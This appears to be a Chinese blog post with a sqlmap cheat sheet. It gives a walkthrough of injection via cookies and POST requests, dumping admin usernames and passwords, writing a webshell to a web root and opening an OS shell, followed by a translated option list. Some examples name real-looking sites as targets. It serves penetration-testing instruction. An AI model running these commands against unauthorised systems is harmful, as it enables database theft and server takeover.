-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	cookie注入
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	当程序有防get注入的时候，可以使用cookie注入<br />
-sqlmap -u "http://www.baidu.com/shownews.asp" --cookie "id=11" --level 2（只有level达到2才会检测cookie）
-</p>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	从post数据包中注入
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	可以使用burpsuite或者temperdata等工具来抓取post包
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -r "c:\tools\request.txt" -p "username" --dbms mysql &nbsp; &nbsp;指定username参数
-</p>
-<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	注入成功后
-</h2>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	获取数据库基本信息
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 --dbs
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	查询有哪些数据库
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test --tables
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	查询test数据库中有哪些表
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test -T admin --columns
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	查询test数据库中admin表有哪些字段
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -u "http://www.vuln.cn/post.php?id=1" &nbsp;--dbms mysql --level 3 -D test -T admin -C "username,password" --dump
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	dump出字段username与password中的数据
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	其他命令参考下面
-</p>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	从数据库中搜索字段
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -r "c:\tools\request.txt" --dbms mysql -D dedecms --search -C admin,password<br />
-在dedecms数据库中搜索字段admin或者password。
-</p>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	读取与写入文件
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	首先找需要网站的物理路径，其次需要有可写或可读权限。
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	--file-read=RFILE 从后端的数据库管理系统文件系统读取文件 （物理路径）<br />
---file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件 （mssql xp_shell）<br />
---file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径<br />
-#示例：<br />
-sqlmap -r "c:\request.txt" -p id --dbms mysql --file-dest "e:\php\htdocs\dvwa\inc\include\1.php" --file-write "f:\webshell\1112.php"
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	使用shell命令：
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	sqlmap -r "c:\tools\request.txt" -p id --dms mysql --os-shell<br />
-接下来指定网站可写目录：<br />
-“E:\php\htdocs\dvwa”
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	#注：mysql不支持列目录，仅支持读取单个文件。sqlserver可以列目录，不能读写文件，但需要一个（xp_dirtree函数）
-</p>
-<h2 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	sqlmap详细命令：
-</h2>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--is-dba 当前用户权限（是否为root权限）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--dbs 所有数据库
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--current-db 网站当前数据库
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--users 所有数据库用户
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--current-user 当前数据库用户
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--random-agent 构造随机user-agent
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--passwords 数据库密码
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--proxy http://local:8080 --threads 10 (可以自定义线程加速) 代理
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
-	</li>
-</ul>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	——————————————————————————————————
-</p>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Options（选项）：
-</h3>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--version 显示程序的版本号并退出
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-h, --help 显示此帮助消息并退出
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-v VERBOSE 详细级别：0-6（默认为1）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		保存进度继续跑：
-	</li>
-</ul>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<span style="color:#444444;">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” 保存进度</span><br style="color:#444444;" />
-<span style="color:#444444;">sqlmap -u “http://url/news?id=1“ –dbs-o “sqlmap.log” –resume 恢复已保存进度</span>
-</p>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Target（目标）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	以下至少需要设置其中一个选项，设置目标URL。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-d DIRECT 直接连接到数据库。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-u URL, --url=URL 目标URL。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-l LIST 从Burp或WebScarab代理的日志中解析目标。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-r REQUESTFILE 从一个文件中载入HTTP请求。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-g GOOGLEDORK 处理Google dork的结果作为目标URL。
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-c CONFIGFILE 从INI配置文件中加载选项。
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Request（请求）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以用来指定如何连接到目标URL。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--data=DATA 通过POST发送的数据字符串
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--cookie=COOKIE HTTP Cookie头
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--cookie-urlencode URL 编码生成的cookie注入
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--drop-set-cookie 忽略响应的Set - Cookie头信息
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--user-agent=AGENT 指定 HTTP User - Agent头
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--random-agent 使用随机选定的HTTP User - Agent头
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--referer=REFERER 指定 HTTP Referer头
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--headers=HEADERS 换行分开，加入其他的HTTP头
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--auth-type=ATYPE HTTP身份验证类型（基本，摘要或NTLM）(Basic, Digest or NTLM)
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--auth-cred=ACRED HTTP身份验证凭据（用户名:密码）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--auth-cert=ACERT HTTP认证证书（key_file，cert_file）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--proxy=PROXY 使用HTTP代理连接到目标URL
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--proxy-cred=PCRED HTTP代理身份验证凭据（用户名：密码）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--ignore-proxy 忽略系统默认的HTTP代理
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--delay=DELAY 在每个HTTP请求之间的延迟时间，单位为秒
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--timeout=TIMEOUT 等待连接超时的时间（默认为30秒）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--retries=RETRIES 连接超时后重新连接的时间（默认3）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--scope=SCOPE 从所提供的代理日志中过滤器目标的正则表达式
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--safe-url=SAFURL 在测试过程中经常访问的url地址
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--safe-freq=SAFREQ 两次访问之间测试请求，给出安全的URL
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Enumeration（枚举）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以用来列举后端数据库管理系统的信息、表中的结构和数据。此外，您还可以运行<br />
-您自己的SQL语句。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-b, --banner 检索数据库管理系统的标识
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--current-user 检索数据库管理系统当前用户
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--current-db 检索数据库管理系统当前数据库
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--is-dba 检测DBMS当前用户是否DBA
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--users 枚举数据库管理系统用户
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--passwords 枚举数据库管理系统用户密码哈希
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--privileges 枚举数据库管理系统用户的权限
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--roles 枚举数据库管理系统用户的角色
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--dbs 枚举数据库管理系统数据库
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-D DBname 要进行枚举的指定数据库名
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-T TBLname 要进行枚举的指定数据库表（如：-T tablename --columns）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--tables 枚举的DBMS数据库中的表
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--columns 枚举DBMS数据库表列
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--dump 转储数据库管理系统的数据库中的表项
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--dump-all 转储所有的DBMS数据库表中的条目
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--search 搜索列（S），表（S）和/或数据库名称（S）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-C COL 要进行枚举的数据库列
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-U USER 用来进行枚举的数据库用户
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--exclude-sysdbs 枚举表时排除系统数据库
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--start=LIMITSTART 第一个查询输出进入检索
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--stop=LIMITSTOP 最后查询的输出进入检索
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--first=FIRSTCHAR 第一个查询输出字的字符检索
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--last=LASTCHAR 最后查询的输出字字符检索
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--sql-query=QUERY 要执行的SQL语句
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--sql-shell 提示交互式SQL的shell
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Optimization（优化）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可用于优化SqlMap的性能。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-o 开启所有优化开关
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--predict-output 预测常见的查询输出
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--keep-alive 使用持久的HTTP（S）连接
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--null-connection 从没有实际的HTTP响应体中检索页面长度
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--threads=THREADS 最大的HTTP（S）请求并发量（默认为1）
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Injection（注入）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以用来指定测试哪些参数， 提供自定义的注入payloads和可选篡改脚本。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-p TESTPARAMETER 可测试的参数（S）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--dbms=DBMS 强制后端的DBMS为此值
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--os=OS 强制后端的DBMS操作系统为这个值
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--prefix=PREFIX 注入payload字符串前缀
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--suffix=SUFFIX 注入payload字符串后缀
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--tamper=TAMPER 使用给定的脚本（S）篡改注入数据
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Detection（检测）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以用来指定在SQL盲注时如何解析和比较HTTP响应页面的内容。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--level=LEVEL 执行测试的等级（1-5，默认为1）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--risk=RISK 执行测试的风险（0-3，默认为1）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--string=STRING 查询时有效时在页面匹配字符串
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--regexp=REGEXP 查询时有效时在页面匹配正则表达式
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--text-only 仅基于在文本内容比较网页
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Techniques（技巧）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可用于调整具体的SQL注入测试。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--technique=TECH SQL注入技术测试（默认BEUST）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--time-sec=TIMESEC DBMS响应的延迟时间（默认为5秒）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--union-cols=UCOLS 定列范围用于测试UNION查询注入
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--union-char=UCHAR 用于暴力猜解列数的字符
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Fingerprint（指纹）：
-</h3>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-f, --fingerprint 执行检查广泛的DBMS版本指纹
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Brute force（蛮力）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以被用来运行蛮力检查。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--common-tables 检查存在共同表
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--common-columns 检查存在共同列
-	</li>
-</ul>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	User-defined function injection（用户自定义函数注入）：<br />
-这些选项可以用来创建用户自定义函数。
-</p>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	--udf-inject 注入用户自定义函数<br />
---shared-lib=SHLIB 共享库的本地路径
-</p>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	File system access（访问文件系统）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以被用来访问后端数据库管理系统的底层文件系统。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--file-read=RFILE 从后端的数据库管理系统文件系统读取文件
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--file-write=WFILE 编辑后端的数据库管理系统文件系统上的本地文件
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--file-dest=DFILE 后端的数据库管理系统写入文件的绝对路径
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Operating system access（操作系统访问）：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以用于访问后端数据库管理系统的底层操作系统。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--os-cmd=OSCMD 执行操作系统命令
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--os-shell 交互式的操作系统的shell
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--os-pwn 获取一个OOB shell，meterpreter或VNC
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--os-smbrelay 一键获取一个OOB shell，meterpreter或VNC
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--os-bof 存储过程缓冲区溢出利用
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--priv-esc 数据库进程用户权限提升
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--msf-path=MSFPATH Metasploit Framework本地的安装路径
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--tmp-path=TMPPATH 远程临时文件目录的绝对路径
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Windows注册表访问：
-</h3>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以被用来访问后端数据库管理系统Windows注册表。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--reg-read 读一个Windows注册表项值
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--reg-add 写一个Windows注册表项值数据
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--reg-del 删除Windows注册表键值
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--reg-key=REGKEY Windows注册表键
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--reg-value=REGVAL Windows注册表项值
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--reg-data=REGDATA Windows注册表键值数据
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--reg-type=REGTYPE Windows注册表项值类型
-	</li>
-</ul>
-<p style="margin-top:0px;margin-bottom:0px;padding:0px;text-indent:2em;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	这些选项可以用来设置一些一般的工作参数。
-</p>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-t TRAFFICFILE 记录所有HTTP流量到一个文本文件中
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		-s SESSIONFILE 保存和恢复检索会话文件的所有数据
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--flush-session 刷新当前目标的会话文件
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--fresh-queries 忽略在会话文件中存储的查询结果
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--eta 显示每个输出的预计到达时间
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--update 更新SqlMap
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--save file保存选项到INI配置文件
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--batch 从不询问用户输入，使用所有默认配置。
-	</li>
-</ul>
-<h3 style="margin:15px 0px;padding:2px 0px 2px 10px;color:#262626;overflow:hidden;border-left:4px solid #169FE6;font-family:&quot;white-space:normal;background-color:#FAFAFA;">
-	Miscellaneous（杂项）：
-</h3>
-<ul style="margin:10px 20px;padding:0px;list-style:none;font-family:&quot;font-size:14px;white-space:normal;background-color:#FAFAFA;">
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--beep 发现SQL注入时提醒
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--check-payload IDS对注入payloads的检测测试
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--cleanup SqlMap具体的UDF和表清理DBMS
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--forms 对目标URL的解析和测试形式
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--gpage=GOOGLEPAGE 从指定的页码使用谷歌dork结果
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--page-rank Google dork结果显示网页排名（PR）
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--parse-errors 从响应页面解析数据库管理系统的错误消息
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--replicate 复制转储的数据到一个sqlite3数据库
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--tor 使用默认的Tor（Vidalia/ Privoxy/ Polipo）代理地址
-	</li>
-	<li style="list-style:square;margin-left:15px;color:#666666;">
-		--wizard 给初级用户的简单向导界面
-	</li>
-</ul>
-
-<p>
-	sqlmap-u http://testphp.vulnweb.com/listproducts.php?cat=1
-</p>
-<p>
-	sqlmap-master\sqlmap.py -u &nbsp;"http://www.ddd.com/index?d=55" --batch --banner
-</p>
-
-
-
-<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/sectool/164608.html">https://www.freebuf.com/sectool/164608.html</a></p>
